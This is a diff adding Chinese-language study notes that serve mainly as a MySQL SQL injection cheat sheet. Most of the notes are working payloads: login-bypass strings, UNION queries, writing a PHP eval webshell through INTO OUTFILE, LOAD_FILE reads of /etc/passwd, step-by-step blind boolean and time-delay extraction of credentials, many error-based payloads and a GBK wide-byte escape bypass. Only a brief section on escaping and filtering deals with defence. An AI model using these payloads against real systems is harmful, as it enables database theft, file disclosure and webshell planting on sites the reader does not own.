@@ -1,0 +1,387 @@
+
+#####注释符
+select 1+1;
+select 1+1; #这是一个注释,单行注释
+select 1+1; -- 这是一个注释，单行注释
+select 1+1; /*这是一个注释*/，多行注释
+select/*这是一个注释*/1+1;
+
+--  ：-- 后都被注释
+
+select usrename,password from admin where username='1' or 1=1 -- fdssfsfafs
+select usrename,password from admin where username='1' or 2>1  -- fdssfsfafs
+select usrename,password from admin where username='1' or true -- fdssfsfafs
+
+select usrename,password from admin where username='1' or !false -- fdssfsfafs
+
+########
+SQL注入
+########
+
+1. bool注入： 返回真或假
+2. 联合注入； 一起查询 union
+3. 延时注入： 定时器查询
+4. 报错注入： 报错但是信息是我们想要的
+
+#####注入类型
+通过有无单双引号，判断是否需要闭合，进而判断，输入的类型，int or string 类型。
+1. 整型 int
+2。 字符串 string 。
+
+
+
+######## 导出数据库
+
+select * from admin into outfile 'd:/1.sql';
+select * from admin into outfile 'd:/1.php';
+
+##直接创建一个新文件，访问的时候直接访问php文件获取敏感信息。
+ select '<?php phpinfo(); ?>' into outfile 'd:/1.php';
+ 
+ 
+###,先判断字段数目，1,2,3.结合联合注入，生成可执行的php代码文件。
+ select * from admin where id=222 and 1=2 union select 1,2,3;
+ select * from admin where id=2 and 1=1 union select 1,2,3 into outfile 'd:/2.php';
+ select * from admin where id=2 and 1=1 union select 1,'<?php echo 1; ?>',3 into outfile 'd:/2.php';
+ 
+ ########burpsuite 结合sql注入。
+Decoder功能，将代码转码成ascii，hex，==
+e.g.:
+<?php phpinfo(); ?>
+3c3f70687020706870696e666f28293b203f3e
+
+####结合burp 使用注入，转码，。。
+select * from admin where id=2 and 1=1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3 into outfile 'd:/22.php';
+
+########拿取webshell ，导出数据库
+select '<?php eval($_POST['cmd']) ?> into outfile 'd:/1.php';
+
+###读文件load_file（）
+
+load_file(0x643a2f312e747874);0x643a2f312e747874 对应d:/1.txt，不要有空格或者引号，前面注意0x 进制。
+ select load_file(0x643a2f312e747874);		select load_file('d:1.txt');十六进制时不用将双引号转码。
+ select load_file(0x643a2f32322e706870);		d:/22.php
+ 
+select load_file('d:/1.txt');
+select * from admin where id=2 union select  1,2,load_file('d:/1.txt');
+
+1、../ 它可以帮助返回上一级目录，
+select load_file('/etc/php/../passwd');
+2、使用16进制
+select load_file(0x2f6574632f706173737764);
+
+3、使用char函数
+select load_file(char(47,101,116,99,47,112,97,115,115,119,100));
+
+
+
+##########into file 
+Into OutFile
+基本格式很简单
+select 'test' into outfile '/home/1.txt';
+
+1、如果你有两个列或者更多的列，你必须使用null来替换该列，否则这些数据会和文本一起写入你的文件。
+
+2、如果你想要在文本中使用 Return/Enter 按钮，你可以转换成hex或者使用char函数。
+######
+
+#######探测web服务器路径
+
+默认情况下，PHP关闭自定义错误消息。有很多方法来强制 应用程序返回包含内部信息的错误消息。
+1.比如注入一个单引号：
+Fatal error: Call to a member function execute() on a non-object in /var/www/output.php
+on line 15
+2.通过LOAD_FILE方法，下面是在Apache 2.2版本上加载Apache配置文件的查询的示例：
+SELECT LOAD_FILE('/etc/apache2/sites-available/default')
+
+
+
+#########查看数据库版本
+ select @@innodb_version;
+#########
+hex()：可以用将一个字符串或数字转换为十六进制格式的字符串
+
+select hex('d:/1.txt');
+select unhex('643A');
+
+unhex()：把十六进制格式的字符串转化为原来的格式
+
+conv():MySQL数字的进制转换
+
+####version() 转换成十六进制然后再转换成十进制：
+select conv(hex(version()), 16, 10); 
+##解码
+select unhex(conv(58472576987956,10,16));
+
+
+里是有限制的，在MySQL中最高的数据类型是BIGINT。我们不能超过它，字符串的最大长度可以是8个字符。下面看演示：
+
+select conv(hex('AAAAAAAA'),16,10);
+select unhex(conv(4702111234474983745,10,16));
+
+###可以发现值4702111234474983745可以被解码回AAAAAAAA如果我们再添加一个呢?
+select conv(hex('AAAAAAAAA'),16,10);
+select conv(hex('AAAAAAAAA'),16,10) = ~0;
+###我们不会得到一个正确的十进制值，而是无符号的无符号BIGINT。我们知道了这个限制就很容易了，
+##我们可以在编码的时候使用substr()函数来截取字符串，最后解码的时候使用concat()函数连接字符串。
+ select conv(hex(substr(user(),1,8)),16,10);
+  select conv(hex(substr(user(),9,16)),16,10);
+  ##然后使用concat()函数连接：
+  select concat(unhex(conv(8245931987826405219, 10, 16)), unhex(conv(107118236496756, 10,16)));
+  ##获取mysql.user和文件权限
+  select group_concat(user,0x3a,file_priv) from mysql.user;
+  可以看见你的名字旁边有个Y，这就代表你有文件权限，N就是没有。
+  root:Y,root:Y,root:Y        
+  
+  
+  ###锚点，html中# 跳转 # 代表锚点了。
+  所以要编码# 为%23,。
+  
+  
+  ######bool注入：
+  mid(str,1,3),字符串截取，使用 select mid('hello',1,3);
+  ORD（） 转换成ascii编码,select ord('为');
+  length（） 统计字节长度
+  version（）
+  database()
+  user()
+  
+  ascii()  : 将字符转换为ascii码， select ascii('a');
+
+  ##########\
+步骤：
+  1. 获取数据库长度
+  usrename ='111' or length(database())>1 # &password=222&act=tijian
+  usrename ='111' or length(database())=8 # &password=222&act=tijian
+  2. 获取数据库名字
+  mid（database(),1,1）='s';   获取第一个字符，依次ord判断字符ascii为什么？
+  mid（database(),2,1）='q';
+  ord（mid（database(),1,1））;
+  3.依次类推。 获取完整数据库名字
+  4. 获取表的总数
+  select count(table_name) from information_schema.tables where table_schema=database();
+  5. 获取表名的长度
+  
+  
+  1) 第一个表长度
+  username='111' or (select length(table_name) from information_schema.tables where 
+  table_schema=database() limit 0,1) =5  # &password=222&act=tijian
+  2） 第二个表长度
+   username='111' or (select length(table_name) from information_schema.tables where 
+  table_schema=database() limit 1,1) =5  # &password=222&act=tijian
+  
+  
+  6. 获取表名内容：
+  username=111' or mid((select  table_schema from information_schema.tables where table_schema=database() limit 0,1),1,1) ='a';
+  username=111' or select 1,table_name from information_schema.tables where table_schema=0x61646d697e limit 0,1		#16进制是admin
+  
+  7. 获取字段总数。
+  
+   username=‘111’ or (select count(column_name) from information_schema.columns where table_name='admin') =8;
+  8. 获取第一个字段长度
+ usernaem = '111' or ( select length(column_name) from information_schema.columns where table_name='admin' limit 0,1) =2;
+  9. 获取字段长度内容
+  usernaem = '111' or ( select column_name from information_schema.columns where table_name='admin' limit 0,1) ='id';
+    usernaem = '111' or ( select column_name from information_schema.columns where table_name='admin' limit 1,1) ='id';
+  usernaem = '111' or ( select column_name from information_schema.columns where table_name='admin' limit 2,1) ='id';
+  10. 获取内容长度。
+  username, password
+  concat(username,"------",password)
+  username='111' or (select length(concat(username,"------",password)) from admin limit 0,1)=16;
+  
+  11.  获取内容 ：
+  select concat(username,"------",password) from admin limit 0,1 ='sd';
+  select concat(username,"------",password) from admin limit 1,1 ='q';
+   select concat(username,"------",password) from admin limit 1,1 =  '223---2131';
+  
+  
+  
+###################
+延时注入：
+#############
+ 防止一些防火墙的针对性措施，例如几秒内访问一次。
+ 
+ 
+ 步骤：
+	获取数据库总数：
+	获取特定数据库长度：
+	获取特定数据库内容：
+	获取表总数：
+	获取特定表的长度：
+	获取特定表内容：
+	获取字段总数：
+	获取特定字段长度：
+	获取特定字段内容：
+	
+	
+	sleep(1);
+	if() 函数判断：
+	select if(2>1,1,0);
+	
+	##判断条件时要有where字句，不能or 或者and 单独使用
+	select * from admin where id =2 and sleep(5);
+	
+	###
+	mysql> select * from admin where username='ppi' and sleep( if((select count(schema_name) from information_schema.schemata) >1,5,0));
+	 username='111' and sleep(if((select count(schema_name) from information_schema.schemata) >1,5,0));
+	如果数据库总数大于1 ，则延时5s钟，否则不延时
+	
+	
+	
+	
+	##别名 as 可省略
+	select username (as) x  from admin;
+	
+	select * admin (as) XX where XX.id=1;
+	
+	
+	
+########
+报错注入：
+####
+1） 利用数据库的bug。
+
+
+使用函数：
+	只要是count() ,rand() group by 三个连用就会产生这个报错。
+	left(rand(),3) == 不一定报错
+	floor(rand(0)*2) ==一定报错
+	round(x,d) //x 指要处理的数，d 是指保留几位小数
+	concat() //字符串拼接
+
+  
+e.g.  ： 直接百度mysql 高级报错注入
+	
+	1)select count(*),concat(left(rand(),3),"--",(select version())) x from admin group by x;
+返回结果：
++----------+-------------+
+| count(*) | x           |
++----------+-------------+
+|        1 | 0.0--5.5.53 |
+|        1 | 0.3--5.5.53 |
+|        1 | 0.6--5.5.53 |
++----------+-------------+
+	2)(select 1 from (select count(*),concat(version(),floor(rand(0)*2 )) as x from information_schema.tables group by x) as a)；
+
+报错输出版本
+ERROR 1062 (23000): Duplicate entry '5.5.531' for key 'group_key'
+	
+	
+	##数据表内要有三条以上数据
+	3） select concat(floor(rand(0)*2),"++++") as x, count(1) from admin group by x;
+	select concat(floor(rand(0)*2),"++++") as x, count(1) from ll group by x;
+	
+	select concat(floor(rand(0)*2),(select database())) as x, count(1) from admin group by x;
+可以直接输出函数的输出 类型为’1+ 输出‘ ,本例子报错数据库名
+ERROR 1062 (23000): Duplicate entry '1demo1' for key 'group_key'
+报错用户名出来：
+select concat(floor(rand(0)*2),(select user())) as x, count(1) from admin group by x;
+：报错表名出来，依次类推，报错数据库内容出来。
+同时也支持16进制
+select concat(floor(rand(0)*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1)) as x, count(1) from admin group by x;
+	
+	######常用sql语句
+	###4)通过updatexml()报错   ,user()  ，常用sql语句
+			1)select * from admin where id =2 and 1=(updatexml(1,concat(0x3a,(select user())),1));
+		
+			2)###报错输出 当前数据库名字
+	select * from admin where id =2 and row(5268,000) > (select count(*),concat(0x20,(mid((ifnull(cast((select database()) as char),0x20)),1,128)),0x2d2d2d2d2d6c696d69743a,floor(rand(0)*2))x from (select 7159 union select 8663 union select 7051 union select 9356)a group by x);
+			
+			3） 
+			select * from admin where id =2 and  extractvalue(1,concat(0x5c,(select database() limit 0,1)));
+		4)通过exists （）注入： 获得版本
+		and exists(select * from( select * from (select name_const(version(),0))a join (select name_const(version(),0))b)c);
+	####4） 通过join 报错字段注入
+	select * from(select * from 表名 a join 表名 b ) c);
+	
+	5) 通过exp注入报错,根据版本来
+	select * from admin where id =2 and exp(~(select * from (select user()) a));
+	
+	6） 通过geometrycollection() 报错注入：
+	select * from admin where id =2  and geometrycollection((select * from (select * from (select user())a)b));
+	
+	7) 通过 polygon() baocuo 
+	and polygon((select * from (select * from(select user())a)b));
+	
+	8) 通过multipoint（）报错
+	and multipoint((select * from (select * from(select user())a)b));
+	
+	9) 通过multilinestring() baocuo :
+	and multilinestring((select * from (select * from(select user())a)b));
+	
+	10) tongguo  multipolygon 报错L
+	and multipolygon((select * from (select * from(select user())a)b));
+	
+	11) 通过linestring() 报错：
+	and linestring((select * from (select * from(select user())a)b));
+	
+有些报错根据版本来 ，不能抢上。
+.
+
+
+
+
+###############
+mysql漏洞修补
+##############
+
+1)要将单双引号转义使用、。  \'   ,   \"
+  addslashes  ： 字符串修改
+  int 		  ：直接转换为INT类型
+  
+2) 过滤
+   比如过滤select from ，或者改成别的字符串。
+   过滤时候小心））））） 小心程序中的（） ，要一一对应
+
+  
+	#############
+	SQL注入 判断：
+	###############
+	世人如猪，该宰当宰。
+	
+	判断整型 、 字符串
+	加减乘除判断整型 。
+	
+########宽字节注入。只有是gbk时候才会出现，不行百度。
+	先使用一个单引号' 判断是否有错误,如果单引号被过滤，使用宽字节注入，%df%df%27
+	不行则用%df%27  ，因为会被解读成为%df%5c%27 而，gbk是两个字节定义为一个汉字的，%df%5c会被解读为一个汉字“”
+	或者使用%df%df%27，%df%df 会被gbk解读为一个汉字、
+	
+##多语句注入：
+	select 1;select 2;select 3;
+	使用多语句配合insert注入
+	select 1;select 2;insert into admin values("1","2",(select user()));
+	多语句配合load_file 函数实现注入。load_file（）函数使用时注意权限使用问题。
+	select 1;select 2;insert into admin values("1","2",(select load_file(0x3c3f70687020706870696e666f28293b203f3e)));
+	
+	
+##查看数据库名
+select group_concat(schema_name) from information_schema.schemata;
+
+### 查看表名 
+select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database();
+
+###添加型注入：
+	insert ，update，select，delete（只能支持bool和延时）。
+	
+	select 111,222,table_name from information_schema.tables where table_schema=database() limit 0,1;
+	select 1;select 2;insert into admin values("sda",6,(select concat(111,222,(select table_name from information_schema.tables where table_schema=database() limit 0,1))));
+	配合load_file实现查看
+	insert into values("kksk",7,(select load_file('d:/1.txt')));
+	
+####删除型注入：
+
+	bool注入：# delete from admin where id=2 and (select database()) ='demo';
+			  # delete from admin where id=2 and 1=2;
+	延时注入：
+	and 有先后顺序，如果第一个失败，后一个不会执行判断了。
+			# delete from admin where id=10 and sleep(if( (select database())  ='demo',5,0 ));
+			
+####修改型注入 update
+		 e.g.: update admin set xxx=‘ss’，yy='kk' where  id =2
+		
+		 1) update admin set password=(select database()) where id=1;
+		 
+		 
+####
+		
